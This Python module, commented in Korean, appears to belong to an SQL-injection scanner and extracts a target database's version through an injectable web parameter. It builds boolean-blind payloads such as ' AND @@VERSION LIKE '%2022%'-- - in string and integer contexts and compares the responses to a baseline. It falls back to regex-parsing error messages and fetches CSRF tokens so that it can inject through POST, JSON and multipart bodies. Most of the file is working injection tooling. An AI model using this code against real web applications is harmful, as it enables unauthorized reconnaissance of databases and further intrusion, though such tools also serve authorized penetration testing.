import re
import time
import httpx

from .models import DBMSType, Parameter, ParamLocation, ProbeLog, NmapDBInfo
from .payloads import VERSION_PROBES, ERROR_VERSION_PROBES
from .prober import (
    send_probe, _build_headers, _build_cookies, _build_baseline_request,
    _inject_param, _to_integer_context,
    fetch_csrf_token,
)


# Nmap mssql.lua VERSION_LOOKUP_TABLE 기반
# SERVERPROPERTY('ProductMajorVersion') 반환값 → 제품 연도
MSSQL_VERSION_MAP: dict[str, str] = {
    "8":  "2000",
    "9":  "2005",
    "10": "2008",
    "11": "2012",
    "12": "2014",
    "13": "2016",
    "14": "2017",
    "15": "2019",
    "16": "2022",
}

# MSSQL: @@VERSION LIKE 기반 버전 프로브 (Nmap VERSION_LOOKUP_TABLE 순서 반영)
# 문자열형: ' AND @@VERSION LIKE '%2022%'-- -
# 정수형:     AND @@VERSION LIKE '%2022%'-- -  (파라미터 값이 숫자일 때)
def _mssql_version_probes(integer_based: bool) -> list[tuple[str, str]]:
    prefix = " " if integer_based else "' "
    return [
        (v, f"{prefix}AND @@VERSION LIKE '%{v}%'-- -")
        for _, v in sorted(MSSQL_VERSION_MAP.items(), key=lambda x: int(x[0]), reverse=True)
    ]


async def _fetch_baseline(
    client: httpx.AsyncClient,
    url: str,
    params: list[Parameter],
    auth: dict[str, str],
    method: str,
    enctype: str = "",
    csrf_tokens: dict[str, str] | None = None,
) -> tuple[int, int]:
    """모든 파라미터 원본 값으로 요청해 baseline 상태코드와 응답 길이를 확보한다."""
    baseline_url, body = _build_baseline_request(url, params)
    if csrf_tokens:
        body.update(csrf_tokens)
    headers = _build_headers(params[0], "", auth)
    cookies = _build_cookies(auth)
    try:
        if method == "POST":
            if enctype == "multipart/form-data":
                files = {k: (None, str(v)) for k, v in body.items()}
                resp = await client.post(baseline_url, files=files, headers=headers, cookies=cookies)
            elif enctype == "application/json":
                resp = await client.post(baseline_url, json=body, headers=headers, cookies=cookies)
            else:
                resp = await client.post(baseline_url, data=body, headers=headers, cookies=cookies)
        else:
            resp = await client.get(baseline_url, headers=headers, cookies=cookies)
        return resp.status_code, len(resp.content)
    except httpx.RequestError:
        return 0, 0


async def _try_version_probes(
    client: httpx.AsyncClient,
    url: str,
    param: Parameter,
    auth: dict[str, str],
    method: str,
    probes: list[tuple[str, str]],
    baseline_status: int,
    baseline_length: int,
    enctype: str = "",
    all_params: list[Parameter] | None = None,
    csrf_tokens: dict[str, str] | None = None,
) -> tuple[str | None, list[ProbeLog]]:
    """주어진 프로브 목록을 순회하며 baseline과 일치하는 응답을 찾으면 해당 라벨 반환."""
    logs: list[ProbeLog] = []
    for label, payload in probes:
        log = await send_probe(
            client, url, param, payload, auth, method,
            csrf_tokens=csrf_tokens, enctype=enctype, all_params=all_params,
        )
        logs.append(log)

        if log.response_status == 0:
            continue

        length_diff = abs(log.response_length - baseline_length)
        status_match = log.response_status == baseline_status
        threshold = max(50, int(baseline_length * 0.01))

        # 정상 응답과 같은 패턴이면 해당 버전 조건이 참
        if status_match and length_diff <= threshold:
            return label, logs

    return None, logs


async def _try_error_version_extraction(
    client: httpx.AsyncClient,
    url: str,
    param: Parameter,
    auth: dict[str, str],
    method: str,
    dbms: DBMSType,
    enctype: str = "",
    all_params: list[Parameter] | None = None,
    csrf_tokens: dict[str, str] | None = None,
) -> tuple[str | None, list[ProbeLog]]:
    """에러 메시지에서 직접 버전을 파싱한다. Boolean 프로빙 실패 시 fallback."""
    logs: list[ProbeLog] = []
    for payload, pattern in ERROR_VERSION_PROBES.get(dbms, []):
        injected_url, body = _inject_param(url, param, payload, all_params)
        if csrf_tokens:
            body.update(csrf_tokens)
        headers = _build_headers(param, payload, auth)
        cookies = _build_cookies(auth)

        start = time.monotonic()
        try:
            is_post = method == "POST" or param.location == ParamLocation.BODY
            if is_post:
                if enctype == "multipart/form-data":
                    files = {k: (None, str(v)) for k, v in body.items()}
                    resp = await client.post(injected_url, files=files, headers=headers, cookies=cookies)
                elif enctype == "application/json":
                    resp = await client.post(injected_url, json=body, headers=headers, cookies=cookies)
                else:
                    resp = await client.post(injected_url, data=body, headers=headers, cookies=cookies)
            else:
                resp = await client.get(injected_url, headers=headers, cookies=cookies)
            elapsed_ms = (time.monotonic() - start) * 1000

            logs.append(ProbeLog(
                param=param.name,
                payload=payload,
                response_status=resp.status_code,
                response_length=len(resp.content),
                elapsed_ms=round(elapsed_ms, 2),
            ))

            match = re.search(pattern, resp.text, re.IGNORECASE)
            if match:
                return match.group(1), logs

        except httpx.RequestError:
            elapsed_ms = (time.monotonic() - start) * 1000
            logs.append(ProbeLog(
                param=param.name,
                payload=payload,
                response_status=0,
                response_length=0,
                elapsed_ms=round(elapsed_ms, 2),
            ))

    return None, logs


async def extract_version(
    dbms: DBMSType,
    url: str,
    params: list[Parameter],
    auth: dict[str, str],
    nmap_data: NmapDBInfo | None = None,
    method: str = "GET",
    enctype: str = "",
) -> tuple[str | None, list[ProbeLog]]:
    """
    DBMS 버전을 추출한다.
    Nmap이 버전 문자열을 이미 제공한 경우 요청 없이 바로 반환한다.
    없으면 Boolean 페이로드로 메이저 버전을 탐색한다.

    백엔드의 따옴표 wrapping 여부를 외부에서 알 수 없으므로,
    string context 페이로드로 먼저 시도하고 매칭 실패 시 integer context로 재시도한다.
    """
    logs: list[ProbeLog] = []

    # Nmap에 버전 정보가 있으면 바로 반환
    if nmap_data and nmap_data.version:
        return nmap_data.version, []

    if not params:
        return None, []

    # DBMS별 프로브 두 컨텍스트로 사전 생성
    if dbms == DBMSType.MSSQL:
        probes_str = _mssql_version_probes(integer_based=False)
        probes_int = _mssql_version_probes(integer_based=True)
    else:
        probes_str = VERSION_PROBES.get(dbms, [])
        probes_int = [(label, _to_integer_context(p)) for label, p in probes_str]

    if not probes_str:
        return None, []

    # 주입 가능한 파라미터 중 첫 번째만 사용 (버전 추출은 단일 파라미터로 충분)
    param = params[0]

    async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
        # POST/BODY 조건이면 CSRF 토큰 1회 취득 (phase 마다 새 client라 Phase 1/2 토큰 재사용 불가)
        csrf_tokens: dict[str, str] = {}
        if method == "POST" or any(p.location == ParamLocation.BODY for p in params):
            csrf_tokens = await fetch_csrf_token(client, url, auth)
        csrf_or_none = csrf_tokens or None

        baseline_status, baseline_length = await _fetch_baseline(
            client, url, params, auth, method, enctype, csrf_or_none
        )

        # 1차: string context
        version, str_logs = await _try_version_probes(
            client, url, param, auth, method, probes_str,
            baseline_status, baseline_length, enctype, params, csrf_or_none,
        )
        logs.extend(str_logs)
        if version:
            return version, logs

        # 2차: integer context fallback
        version, int_logs = await _try_version_probes(
            client, url, param, auth, method, probes_int,
            baseline_status, baseline_length, enctype, params, csrf_or_none,
        )
        logs.extend(int_logs)
        if version:
            return version, logs

        # 3차: 에러 메시지 파싱 fallback (boolean 비교가 불가능한 환경 대응)
        version, err_logs = await _try_error_version_extraction(
            client, url, param, auth, method, dbms, enctype, params, csrf_or_none,
        )
        logs.extend(err_logs)
        return version, logs
